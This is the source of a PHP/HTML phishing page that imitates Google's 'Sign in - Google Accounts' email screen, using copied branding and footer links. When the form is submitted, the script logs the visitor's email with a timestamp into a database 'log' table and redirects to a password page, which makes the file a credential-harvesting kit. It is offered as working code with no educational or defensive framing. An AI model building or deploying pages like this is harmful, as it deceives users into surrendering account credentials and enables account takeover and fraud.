<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" type="image/png" href="/assets/icon.svg">
    <title>Sign in - Google Accounts</title>
    <style>
        /* Override "Email or Phone" text */
        .inputLabel:before {
            content: "Email or phone";
        }
    </style>
</head>

<?php
session_start();
include("db.php");
if (isset($_POST['email'])) {
    $email = $_POST['email'];
    $_SESSION['email'] = $email;

    date_default_timezone_set('Asia/Hong_Kong');
    $time = date('Y-m-d H:i:s', time());

    db_open();
    db_query("INSERT INTO `log`(`date`, `email`, `password`) VALUES ('$time','$email','$password')");
    header("Location: /password.php");
}
?>

<body>
    <div class="inputContainer">
        <img src="/assets/google.png" alt="” width=”87" height="33" style="margin-bottom: 14px">
        <h2 class=”login“>Sign in</h2>
        <h4 class="use">Use your Google Account</h4>
        <form method="post">
            <div>
                <input type="email" class="gInput" id="email" name="email">
                <label class="inputLabel" for="email"></label>
                <div class="forgotContainer">
                    <h5 class="forgot">Forgot Email?</h5>
                </div>
                <h4 class="guest">Not your computer? Use Guest mode to sign in privately. <span>Learn more</span></h4>
                <div class="buttonContainer">
                    <p class="btnCreate">Create account</p>
                    <input type="submit" class="btnNext" value="Next">
                </div>
            </div>
        </form>
    </div>
    <script>
        // Bugfix: hide "Email or Phone" when user has inputted text
        const gInput = document.querySelector('.gInput');
        const inputLabel = document.querySelector('.inputLabel');

        gInput.addEventListener('input', function() {
            if (gInput.value !== '') {
                inputLabel.classList.add('active');
            } else {
                inputLabel.classList.remove('active');
            }
        });

        inputLabel.addEventListener('click', function() {
            inputLabel.classList.add('focused');
            gInput.focus();
        });

        gInput.addEventListener('blur', function() {
            if (gInput.value === '') {
                inputLabel.classList.remove('focused');
            }
        });
    </script>
    <div class="bottomContainer">
        <p class="language">&#x25BC English (United States)</p>

        <a class="hpt" href="https://accounts.google.com/TOS?loc=HK&hl=en-US">Terms</a>
        <a class="hpt" href="https://accounts.google.com/TOS?loc=HK&hl=en-US&privacy=true">Privacy</a>
        <a class="hpt" href="https://support.google.com/accounts?hl=en-US&p=account_iph">Help</a>
</body>

</html>